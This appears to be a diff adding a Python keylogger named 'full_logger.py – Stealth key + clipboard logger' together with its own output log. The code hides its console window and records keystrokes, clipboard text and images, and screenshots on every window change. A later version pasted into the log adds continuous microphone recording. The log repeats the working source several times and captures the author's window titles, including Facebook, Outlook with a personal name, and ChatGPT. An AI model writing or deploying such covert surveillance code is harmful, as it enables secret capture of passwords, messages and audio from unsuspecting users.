+start_time  = datetime.now()
+day_folder  = os.path.join(LOG_DIR, start_time.strftime("%Y-%m-%d"))
+session_dir = os.path.join(day_folder,  start_time.strftime("%H-%M-%S"))
+os.makedirs(session_dir, exist_ok=True)
+
+LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")   # text log stays at root
+
+# Hide console window (comment next line while debugging)
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ── Helpers ─────────────────────────────────────────────────────────
+def get_active_window() -> str:
+    """Return '[exe – window title]' for the foreground window."""
+    try:
+        hwnd  = win32gui.GetForegroundWindow()
+        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe   = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return f"[{exe} – {title}]"
+    except Exception as e:
+        return f"[Unknown Window – {e}]"
+
+def save_screenshot(window_title: str):
+    """Grab a screenshot, save it in the session folder, log in main + summary files."""
+    try:
+        now      = datetime.now()
+        ts       = now.strftime("%H%M%S")
+        img_name = f"screenshot_{ts}.png"
+        img_path = os.path.join(session_dir, img_name)
+
+        ImageGrab.grab().save(img_path, "PNG")
+
+        # main log
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {img_path}\n")
+
+        # summary file
+        summary_file = os.path.join(session_dir, "screenshot_summary.txt")
+        with open(summary_file, "a", encoding="utf-8") as f:
+            f.write(f"[{now}] Screenshot → {img_name} | Window: {window_title}\n")
+
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+# ── Clipboard watcher thread ────────────────────────────────────────
+last_clip_txt  = ""
+last_clip_hash = None
+
+def clipboard_watcher():
+    global last_clip_txt, last_clip_hash
+    print("[+] Clipboard watcher running...")   # visible only when console not hidden
+
+    while True:
+        time.sleep(CLIPBOARD_POLL_INTERVAL)
+
+        # ----- Text --------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                txt = win32clipboard.GetClipboardData()
+                if txt and txt != last_clip_txt:
+                    last_clip_txt = txt
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
+            win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑text error: {e}")
+
+        # ----- Image -------------------------------------------------
+        try:
+            img = ImageGrab.grabclipboard()      # Handles most image formats
+            if isinstance(img, Image.Image):
+                img_hash = hashlib.md5(img.tobytes()).hexdigest()
+                if img_hash != last_clip_hash:
+                    last_clip_hash = img_hash
+                    ts = datetime.now().strftime("%H%M%S")
+                    img_path = os.path.join(session_dir, f"clip_{ts}.png")
+                    img.save(img_path, "PNG")
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
+        except Exception as e:
+            print(f"[!] Clipboard‑image error: {e}")
+
+# ── Session header ─────────────────────────────────────────────────
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Logging started: {start_time} ---\n")
+
+# ── Keylogger callbacks ────────────────────────────────────────────
+last_window = None
+
+def on_press(key):
+    global last_window
+
+    # 1) Detect window change → log header + screenshot
+    win = get_active_window()
+    if win != last_window:
+        last_window = win
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win}\n")
+        threading.Thread(target=save_screenshot, args=(win,), daemon=True).start()
+
+    # 2) Convert key to a printable string (handles dead keys / None)
+    try:
+        k = key.char
+        if k is None:
+            raise AttributeError
+    except AttributeError:
+        special = {
+            keyboard.Key.space:  " ",
+            keyboard.Key.enter:  "\n",
+            keyboard.Key.tab:    "\t",
+        }
+        k = special.get(key, f"[{key.name.upper()}]")
+
+    # 3) Append to log
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener
+
+# ── Launch clipboard thread & key listener ─────────────────────────
+Thread(target=clipboard_watcher, daemon=True).start()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+2025-04-12 19:29:26.177017 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-12 19:29:26.177585] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-12\19-29-12\screenshot_192926.png
+
+
+--- Logging started: 2025-04-13 22:57:33.352691 ---
+
+
+2025-04-13 23:00:48.365091 [chrome.exe – Facebook - Google Chrome]
+[MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN]
+[2025-04-13 23:00:48.366038] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-13\22-57-33\screenshot_230048.png
+[MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN][MEDIA_VOLUME_DOWN][ESC]
+
+--- Logging started: 2025-04-13 23:05:45.390774 ---
+
+
+2025-04-13 23:07:05.030090 [Code.exe – system_log.txt - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-13 23:07:05.030713] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-13\23-05-45\screenshot_230705.png
+
+
+--- Logging started: 2025-04-14 19:26:59.350910 ---
+
+
+[2025-04-14 19:27:00.854380] 📋 Copied text:
+last_hwnd = None
+
+def get_active_window_info():
+    """Returns hwnd, formatted window info string"""
+    try:
+        hwnd = win32gui.GetForegroundWindow()
+        pid = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return hwnd, f"[{exe} – {title}]"
+    except Exception as e:
+        return None, f"[Unknown Window – {e}]"
+
+def on_press(key):
+    global last_hwnd
+
+    # 1) Detect window change → log header + screenshot
+    hwnd, win_info = get_active_window_info()
+    if hwnd != last_hwnd:
+        last_hwnd = hwnd
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win_info}\n")
+        threading.Thread(target=save_screenshot, args=(win_info,), daemon=True).start()
+
+
+
+2025-04-14 19:27:19.346582 [chrome.exe – ChatGPT - keylogger - Google Chrome]
+
+
+--- Logging started: 2025-04-14 19:29:04.764005 ---
+
+
+[2025-04-14 19:29:06.267877] 📋 Copied text:
+def on_press(key):
+    global last_hwnd
+
+    # 1) Detect window change → log header + screenshot
+    hwnd, win_info = get_active_window_info()
+    if hwnd != last_hwnd:
+        last_hwnd = hwnd
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win_info}\n")
+        threading.Thread(
+            target=save_screenshot,
+            args=(win_info,),
+            daemon=True
+        ).start()
+
+    # 2) Convert key to a printable string
+    try:
+        k = key.char
+        if k is None:
+            raise AttributeError
+    except AttributeError:
+        special = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab:   "\t",
+        }
+        k = special.get(key, f"[{key.name.upper()}]")
+
+    # 3) Append to log
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+
+
+2025-04-14 19:29:34.504330 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-14 19:29:34.504783] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\19-29-04\screenshot_192934.png
+
+
+--- Logging started: 2025-04-14 19:35:01.533788 ---
+
+
+[2025-04-14 19:35:03.037941] 📋 Copied text:
+"""
+full_logger.py  –  Stealth key + clipboard (text & image) logger
+────────────────────────────────────────────────────────────────
+• Keystrokes in one line, window headers on change
+• Clipboard text   → logged
+• Clipboard image  → saved as PNG + logged
+• Screenshots on window change (one session folder per run)
+• Stop with ESC
+"""
+
+import os, io, time, ctypes, hashlib
+from datetime import datetime
+from threading import Thread
+import threading
+
+from pynput import keyboard
+import win32gui, win32process, win32clipboard
+import psutil
+from PIL import Image, ImageGrab
+
+# ── Configuration ──────────────────────────────────────────────────
+LOG_DIR  = r"C:\Users\asus\keylogger"
+CLIPBOARD_POLL_INTERVAL = 1.5     # seconds
+
+# ── Create session folders ─────────────────────────────────────────
+start_time  = datetime.now()
+day_folder  = os.path.join(LOG_DIR, start_time.strftime("%Y-%m-%d"))
+session_dir = os.path.join(day_folder, start_time.strftime("%H-%M-%S"))
+os.makedirs(session_dir, exist_ok=True)
+
+LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")   # text log stays at root
+
+# Hide console window (comment next line while debugging)
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ── Helpers ─────────────────────────────────────────────────────────
+def get_active_window() -> str:
+    """Return '[exe – window title]' for the foreground window."""
+    try:
+        hwnd  = win32gui.GetForegroundWindow()
+        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe   = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return f"[{exe} – {title}]"
+    except Exception as e:
+        return f"[Unknown Window – {e}]"
+
+def get_active_window_info():
+    """Returns hwnd, formatted window info string."""
+    try:
+        hwnd = win32gui.GetForegroundWindow()
+        pid  = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe  = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return hwnd, f"[{exe} – {title}]"
+    except Exception as e:
+        return None, f"[Unknown Window – {e}]"
+
+def save_screenshot(window_title: str):
+    """Grab a screenshot, save it in the session folder, log in main + summary files."""
+    try:
+        now      = datetime.now()
+        ts       = now.strftime("%H%M%S")
+        img_name = f"screenshot_{ts}.png"
+        img_path = os.path.join(session_dir, img_name)
+        
+        ImageGrab.grab().save(img_path, "PNG")
+
+        # Main log entry
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {img_path}\n")
+
+        # Summary file entry
+        summary_file = os.path.join(session_dir, "screenshot_summary.txt")
+        with open(summary_file, "a", encoding="utf-8") as f:
+            f.write(f"[{now}] Screenshot → {img_name} | Window: {window_title}\n")
+
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+# ── Clipboard watcher thread ────────────────────────────────────────
+last_clip_txt  = ""
+last_clip_hash = None
+
+def clipboard_watcher():
+    global last_clip_txt, last_clip_hash
+    print("[+] Clipboard watcher running...")  # Visible only when console is not hidden
+    while True:
+        time.sleep(CLIPBOARD_POLL_INTERVAL)
+
+        # ----- Text Clipboard --------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                txt = win32clipboard.GetClipboardData()
+                if txt and txt != last_clip_txt:
+                    last_clip_txt = txt
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
+            win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑text error: {e}")
+
+        # ----- Image Clipboard -------------------------------------------------
+        try:
+            img = ImageGrab.grabclipboard()  # Handles most image formats
+            if isinstance(img, Image.Image):
+                img_hash = hashlib.md5(img.tobytes()).hexdigest()
+                if img_hash != last_clip_hash:
+                    last_clip_hash = img_hash
+                    ts = datetime.now().strftime("%H%M%S")
+                    img_path = os.path.join(session_dir, f"clip_{ts}.png")
+                    img.save(img_path, "PNG")
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
+        except Exception as e:
+            print(f"[!] Clipboard‑image error: {e}")
+
+# ── Session header ─────────────────────────────────────────────────
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Logging started: {start_time} ---\n")
+
+# ── Keylogger Callbacks ────────────────────────────────────────────
+
+last_hwnd = None
+
+def on_press(key):
+    global last_hwnd
+
+    # Detect window change → log header and take a screenshot
+    hwnd, win_info = get_active_window_info()
+    if hwnd != last_hwnd:
+        last_hwnd = hwnd
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win_info}\n")
+        threading.Thread(
+            target=save_screenshot,
+            args=(win_info,),
+            daemon=True
+        ).start()
+
+    # Convert key to printable string
+    try:
+        k = key.char or ""
+    except AttributeError:
+        special = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab:   "\t",
+        }
+        k = special.get(key, f"[{key.name.upper()}]")
+
+    # Append the key to the log file
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener if ESC is pressed
+
+# ── Launching Clipboard Watcher and Key Listener ──────────────────
+Thread(target=clipboard_watcher, daemon=True).start()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+2025-04-14 19:35:04.024697 [chrome.exe – keylogger - Screenshot Detection Fix - Google Chrome]
+h
+[2025-04-14 19:35:04.025995] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\19-35-01\screenshot_193504.png
+ellovjhvhgoodsov[BACKSPACE]
+
+2025-04-14 19:35:24.890178 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+
+--- Logging started: 2025-04-14 19:35:54.767196 ---
+
+
+[2025-04-14 19:35:56.271447] 📋 Copied text:
+"""
+full_logger.py  –  Stealth key + clipboard (text & image) logger
+────────────────────────────────────────────────────────────────
+• Keystrokes in one line, window headers on change
+• Clipboard text   → logged
+• Clipboard image  → saved as PNG + logged
+• Screenshots on window change (one session folder per run)
+• Stop with ESC
+"""
+
+import os, io, time, ctypes, hashlib
+from datetime import datetime
+from threading import Thread
+import threading
+
+from pynput import keyboard
+import win32gui, win32process, win32clipboard
+import psutil
+from PIL import Image, ImageGrab
+
+# ── Configuration ──────────────────────────────────────────────────
+LOG_DIR  = r"C:\Users\asus\keylogger"
+CLIPBOARD_POLL_INTERVAL = 1.5     # seconds
+
+# ── Create session folders ─────────────────────────────────────────
+start_time  = datetime.now()
+day_folder  = os.path.join(LOG_DIR, start_time.strftime("%Y-%m-%d"))
+session_dir = os.path.join(day_folder, start_time.strftime("%H-%M-%S"))
+os.makedirs(session_dir, exist_ok=True)
+
+LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")   # text log stays at root
+
+# Hide console window (comment next line while debugging)
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ── Helpers ─────────────────────────────────────────────────────────
+def get_active_window() -> str:
+    """Return '[exe – window title]' for the foreground window."""
+    try:
+        hwnd  = win32gui.GetForegroundWindow()
+        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe   = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return f"[{exe} – {title}]"
+    except Exception as e:
+        return f"[Unknown Window – {e}]"
+
+def get_active_window_info():
+    """Returns hwnd, formatted window info string."""
+    try:
+        hwnd = win32gui.GetForegroundWindow()
+        pid  = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe  = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return hwnd, f"[{exe} – {title}]"
+    except Exception as e:
+        return None, f"[Unknown Window – {e}]"
+
+def save_screenshot(window_title: str):
+    """Grab a screenshot, save it in the session folder, log in main + summary files."""
+    try:
+        now      = datetime.now()
+        ts       = now.strftime("%H%M%S")
+        img_name = f"screenshot_{ts}.png"
+        img_path = os.path.join(session_dir, img_name)
+        
+        ImageGrab.grab().save(img_path, "PNG")
+
+        # Main log entry
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {img_path}\n")
+
+        # Summary file entry
+        summary_file = os.path.join(session_dir, "screenshot_summary.txt")
+        with open(summary_file, "a", encoding="utf-8") as f:
+            f.write(f"[{now}] Screenshot → {img_name} | Window: {window_title}\n")
+
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+
+# ── Clipboard watcher thread ────────────────────────────────────────
+last_clip_txt  = ""
+last_clip_hash = None
+
+def clipboard_watcher():
+    global last_clip_txt, last_clip_hash
+    print("[+] Clipboard watcher running...")  # Visible only when console is not hidden
+    while True:
+        time.sleep(CLIPBOARD_POLL_INTERVAL)
+
+        # ----- Text Clipboard --------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                txt = win32clipboard.GetClipboardData()
+                if txt and txt != last_clip_txt:
+                    last_clip_txt = txt
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
+            win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑text error: {e}")
+
+        # ----- Image Clipboard -------------------------------------------------
+        try:
+            img = ImageGrab.grabclipboard()  # Handles most image formats
+            if isinstance(img, Image.Image):
+                img_hash = hashlib.md5(img.tobytes()).hexdigest()
+                if img_hash != last_clip_hash:
+                    last_clip_hash = img_hash
+                    ts = datetime.now().strftime("%H%M%S")
+                    img_path = os.path.join(session_dir, f"clip_{ts}.png")
+                    img.save(img_path, "PNG")
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
+        except Exception as e:
+            print(f"[!] Clipboard‑image error: {e}")
+
+# ── Session header ─────────────────────────────────────────────────
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Logging started: {start_time} ---\n")
+
+# ── Keylogger Callbacks ────────────────────────────────────────────
+
+last_hwnd = None
+
+def on_press(key):
+    global last_hwnd
+
+    # Detect window change → log header and take a screenshot
+    hwnd, win_info = get_active_window_info()
+    if hwnd != last_hwnd:
+        last_hwnd = hwnd
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win_info}\n")
+        threading.Thread(
+            target=save_screenshot,
+            args=(win_info,),
+            daemon=True
+        ).start()
+
+    # Convert key to printable string
+    try:
+        k = key.char or ""
+    except AttributeError:
+        special = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab:   "\t",
+        }
+        k = special.get(key, f"[{key.name.upper()}]")
+
+    # Append the key to the log file
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener if ESC is pressed
+
+# ── Launching Clipboard Watcher and Key Listener ──────────────────
+Thread(target=clipboard_watcher, daemon=True).start()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+2025-04-14 19:36:03.257691 [chrome.exe – TryHackMe | Hacktivities - Google Chrome]
+w
+[2025-04-14 19:36:03.258344] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\19-35-54\screenshot_193603.png
+af
+
+
+
+2025-04-14 19:36:47.535430 [Spotify.exe – Spotify Premium]
+r
+[2025-04-14 19:36:47.536064] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\19-35-54\screenshot_193647.png
+iles
+
+2025-04-14 19:37:15.203806 [Notepad.exe – screenshot_summary.txt – Bloc-notes]
+b
+[2025-04-14 19:37:15.204765] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\19-35-54\screenshot_193715.png
+jh
+
+2025-04-14 19:37:27.749116 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+
+--- Logging started: 2025-04-14 20:04:42.906791 ---
+
+
+[2025-04-14 20:04:44.410579] 📋 Copied text:
+Thread(target=record_audio_loop, daemon=True).start()
+
+
+
+2025-04-14 20:04:48.285541 [chrome.exe – keylogger - Screenshot Detection Fix - Google Chrome]
+t
+[2025-04-14 20:04:48.286257] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-04-42\screenshot_200448.png
+hats fucking awsssssssomeazertyefezff[BACKSPACE]
+[2025-04-14 20:04:42.909104] 🎤 Audio recorded → C:\Users\asus\keylogger\2025-04-14\20-04-42\mic_200442.wav
+wiwww[CAPS_LOCK]
+
+2025-04-14 20:05:51.487772 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-14 20:05:51.488335] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-04-42\screenshot_200551.png
+
+
+--- Logging started: 2025-04-14 20:17:31.646691 ---
+
+
+[2025-04-14 20:17:33.150813] 📋 Copied text:
+threading.Thread(
+    target=save_webcam_snapshot,
+    daemon=True
+).start()
+
+
+
+2025-04-14 20:17:54.919955 [chrome.exe – keylogger - Screenshot Detection Fix - Google Chrome]
+jb
+[2025-04-14 20:17:54.920494] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-17-31\screenshot_201754.png
+hb
+
+2025-04-14 20:18:02.010398 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-14 20:18:02.010915] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-17-31\screenshot_201802.png
+
+
+--- Logging started: 2025-04-14 20:18:36.270914 ---
+
+
+[2025-04-14 20:18:37.775441] 📋 Copied text:
+threading.Thread(
+    target=save_webcam_snapshot,
+    daemon=True
+).start()
+
+
+
+2025-04-14 20:18:38.099132 [chrome.exe – keylogger - Screenshot Detection Fix - Google Chrome]
+[CTRL_R]
+[2025-04-14 20:18:38.099851] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-18-36\screenshot_201838.png
+
+
+2025-04-14 20:18:55.515984 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+
+--- Logging started: 2025-04-14 20:19:53.756176 ---
+
+
+[2025-04-14 20:19:55.259701] 📋 Copied text:
+threading.Thread(
+    target=save_webcam_snapshot,
+    daemon=True
+).start()
+
+
+
+2025-04-14 20:20:07.471751 [chrome.exe – Courrier - Jasser KHLIFI - Outlook - Google Chrome]
+ 
+[2025-04-14 20:20:07.472371] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-19-53\screenshot_202007.png
+;, kb jk; 
+
+2025-04-14 20:20:35.000911 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-14 20:20:35.001404] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-19-53\screenshot_202035.png
+
+
+--- Logging started: 2025-04-14 20:23:07.628348 ---
+
+
+[2025-04-14 20:23:09.130661] 📋 Copied text:
+"""
+full_logger.py  –  Stealth key + clipboard (text & image) logger
+────────────────────────────────────────────────────────────────
+• Keystrokes in one line, window headers on change
+• Clipboard text   → logged
+• Clipboard image  → saved as PNG + logged
+• Screenshots on window change (one session folder per run)
+• Stop with ESC
+"""
+
+import os, io, time, ctypes, hashlib
+from datetime import datetime
+from threading import Thread
+import threading
+import sounddevice as sd
+import soundfile as sf
+
+from pynput import keyboard
+import win32gui, win32process, win32clipboard
+import psutil
+from PIL import Image, ImageGrab
+
+# ── Configuration ──────────────────────────────────────────────────
+LOG_DIR  = r"C:\Users\asus\keylogger"
+CLIPBOARD_POLL_INTERVAL = 1.5     # seconds
+
+# ── Create session folders ─────────────────────────────────────────
+start_time  = datetime.now()
+day_folder  = os.path.join(LOG_DIR, start_time.strftime("%Y-%m-%d"))
+session_dir = os.path.join(day_folder, start_time.strftime("%H-%M-%S"))
+os.makedirs(session_dir, exist_ok=True)
+
+LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")   # text log stays at root
+
+# Hide console window (comment next line while debugging)
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# ── Helpers ─────────────────────────────────────────────────────────
+def get_active_window() -> str:
+    """Return '[exe – window title]' for the foreground window."""
+    try:
+        hwnd  = win32gui.GetForegroundWindow()
+        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe   = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return f"[{exe} – {title}]"
+    except Exception as e:
+        return f"[Unknown Window – {e}]"
+
+def get_active_window_info():
+    """Returns hwnd, formatted window info string."""
+    try:
+        hwnd = win32gui.GetForegroundWindow()
+        pid  = win32process.GetWindowThreadProcessId(hwnd)[1]
+        exe  = psutil.Process(pid).name()
+        title = win32gui.GetWindowText(hwnd)
+        return hwnd, f"[{exe} – {title}]"
+    except Exception as e:
+        return None, f"[Unknown Window – {e}]"
+
+def save_screenshot(window_title: str):
+    """Grab a screenshot, save it in the session folder, log in main + summary files."""
+    try:
+        now      = datetime.now()
+        ts       = now.strftime("%H%M%S")
+        img_name = f"screenshot_{ts}.png"
+        img_path = os.path.join(session_dir, img_name)
+        
+        ImageGrab.grab().save(img_path, "PNG")
+
+        # Main log entry
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n[{now}] 📸 Screenshot saved → {img_path}\n")
+
+        # Summary file entry
+        summary_file = os.path.join(session_dir, "screenshot_summary.txt")
+        with open(summary_file, "a", encoding="utf-8") as f:
+            f.write(f"[{now}] Screenshot → {img_name} | Window: {window_title}\n")
+
+    except Exception as e:
+        print(f"[!] Screenshot error: {e}")
+        
+        
+        # ── AUDIO RECORD ────────────────────────────────────────
+
+def record_audio_loop(duration=60):
+    """Continuously record audio in chunks (duration in seconds) and save to disk."""
+    fs = 44100  # Sample rate
+    print("[+] Voice recorder running...")  # Will not be visible if console is hidden
+
+    while True:
+        try:
+            now = datetime.now()
+            ts = now.strftime("%H%M%S")
+            filename = os.path.join(session_dir, f"mic_{ts}.wav")
+
+            # Record audio
+            audio = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
+            sd.wait()  # Wait until recording is finished
+
+            # Save as WAV
+            sf.write(filename, audio, fs)
+            
+            # Log entry
+            with open(LOG_FILE, "a", encoding="utf-8") as f:
+                f.write(f"\n[{now}] 🎤 Audio recorded → {filename}\n")
+
+        except Exception as e:
+            print(f"[!] Audio record error: {e}")
+
+# ── Clipboard watcher thread ────────────────────────────────────────
+last_clip_txt  = ""
+last_clip_hash = None
+
+def clipboard_watcher():
+    global last_clip_txt, last_clip_hash
+    print("[+] Clipboard watcher running...")  # Visible only when console is not hidden
+    while True:
+        time.sleep(CLIPBOARD_POLL_INTERVAL)
+
+        # ----- Text Clipboard --------------------------------------------------
+        try:
+            win32clipboard.OpenClipboard()
+            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
+                txt = win32clipboard.GetClipboardData()
+                if txt and txt != last_clip_txt:
+                    last_clip_txt = txt
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
+            win32clipboard.CloseClipboard()
+        except Exception as e:
+            print(f"[!] Clipboard‑text error: {e}")
+
+        # ----- Image Clipboard -------------------------------------------------
+        try:
+            img = ImageGrab.grabclipboard()  # Handles most image formats
+            if isinstance(img, Image.Image):
+                img_hash = hashlib.md5(img.tobytes()).hexdigest()
+                if img_hash != last_clip_hash:
+                    last_clip_hash = img_hash
+                    ts = datetime.now().strftime("%H%M%S")
+                    img_path = os.path.join(session_dir, f"clip_{ts}.png")
+                    img.save(img_path, "PNG")
+                    with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
+        except Exception as e:
+            print(f"[!] Clipboard‑image error: {e}")
+
+# ── Session header ─────────────────────────────────────────────────
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+    f.write(f"\n\n--- Logging started: {start_time} ---\n")
+
+# ── Keylogger Callbacks ────────────────────────────────────────────
+
+last_hwnd = None
+
+def on_press(key):
+    global last_hwnd
+
+    # Detect window change → log header and take a screenshot
+    hwnd, win_info = get_active_window_info()
+    if hwnd != last_hwnd:
+        last_hwnd = hwnd
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"\n\n{datetime.now()} {win_info}\n")
+        threading.Thread(
+            target=save_screenshot,
+            args=(win_info,),
+            daemon=True
+        ).start()
+
+    # Convert key to printable string
+    try:
+        k = key.char or ""
+    except AttributeError:
+        special = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "\n",
+            keyboard.Key.tab:   "\t",
+        }
+        k = special.get(key, f"[{key.name.upper()}]")
+
+    # Append the key to the log file
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(k)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener if ESC is pressed
+
+# ── Launching Clipboard Watcher and Key Listener ──────────────────
+Thread(target=record_audio_loop, daemon=True).start()
+
+Thread(target=clipboard_watcher, daemon=True).start()
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+
+
+2025-04-14 20:23:26.065875 [chrome.exe – keylogger - Screenshot Detection Fix - Google Chrome]
+n
+[2025-04-14 20:23:26.066466] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-23-07\screenshot_202326.png
+o n[BACKSPACE]just by reading the code is there a prob
+
+[2025-04-14 20:23:07.629426] 🎤 Audio recorded → C:\Users\asus\keylogger\2025-04-14\20-23-07\mic_202307.wav
+
+
+2025-04-14 20:24:25.687346 [Code.exe – keylogger.py - keylogger - Visual Studio Code]
+[ESC]
+[2025-04-14 20:24:25.687927] 📸 Screenshot saved → C:\Users\asus\keylogger\2025-04-14\20-23-07\screenshot_202425.png
+
+
